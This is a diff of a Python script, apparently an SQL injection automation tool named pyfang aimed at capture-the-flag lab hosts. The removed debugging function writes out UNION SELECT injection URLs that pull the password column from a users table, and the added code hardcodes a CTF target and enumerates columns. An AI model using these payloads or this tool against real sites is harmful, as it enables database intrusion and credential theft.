@@ -36,22 +36,6 @@ def startup(page, param_string):
 
     return sqli 
 
-def test_html_diff():
-    """ Debugging function """
-
-    # Instantiate classes used
-    scan = scanner.Scanner()
-    store = datastore.Store()
-    parse = parser.Parser(store)
-
-    a = scan.page('http://192.168.83.130/cat.php?id=null%20UNION%20SELECT%201,password,3,4%20from%20users') 
-    b = scan.page('http://192.168.83.130/cat.php?id=null')
-
-    #a = scan.page('http://192.168.83.134/?id=null%20union%20select%201,2,3,4,5,6,user_username%20from%20user')
-    #b = scan.page('http://192.168.83.134/?id=null')
-
-    print parse.html_diff(b, a)
-
 def obfuscate_subquery(obfuscator, obfuscation, subquery):
     """ Takes subquery to obfuscate by encoding.
         :obfuscator:    Obfuscator object.
@@ -110,23 +94,28 @@ if __name__ == '__main__':
 
     if len(sys.argv) == 1:
         print 'Currently pyfang supports:'
-        print 'python pyfang [ip]/[page]?param'
+        print 'python pyfang page="[url]" sqli="[vulnerable param]"'
         sys.exit(0)
-
-    #page = sys.argv[1]
-    # Format is page="page"
-    # Get page and dict of param => value
-    url = sys.argv[1][len('page='):] # take off page=" and ", weird, should be changed later.
-    page_id, param_string = tuple(url.split('?'))
-
-    page = startup(page_id, param_string)
-    print page
 
     # whitespace-delimited file
     mysql_params = open('./lists/mysql/basic_union.txt').read().split()
     #config = open('./configs/mysql/php/query_configs.txt').readlines()
 
+    # Get page and dict of param => value
+    #url = sys.argv[1][len('page='):] # Weird. Should be changed later.
+    #page_id, param_string = tuple(url.split('?'))
+
+    #page = startup(page_id, param_string)
+    #print '\n\n'
+    #print page
+
+    # Currently handling whether string or int here, need to find place for it.
+    #if len(sys.argv) > 3 and sys.argv[3] == 'string':
+    #    page = page[:-1] + "'" + page[-1]
+
     # Instantiate classes used
+    # CTF6
+    page = 'http://192.168.83.134/index.php?id=1'
     build = builder.Builder(page, mysql_params)
     store = datastore.Store()
     scan = scanner.Scanner()
@@ -135,11 +124,10 @@ if __name__ == '__main__':
     parse = parser.Parser(store)
     obfuscate = obfuscator.Obfuscator()
 
-
-
-    #test_sqli_info(page)
-    #num_columns = fang.get_num_columns() 
+    num_columns = fang.get_num_columns() 
+    #print num_columns
     #magic_num = int(fang.get_visible_param())
+    #print num_columns, magic_num
 
 
     """
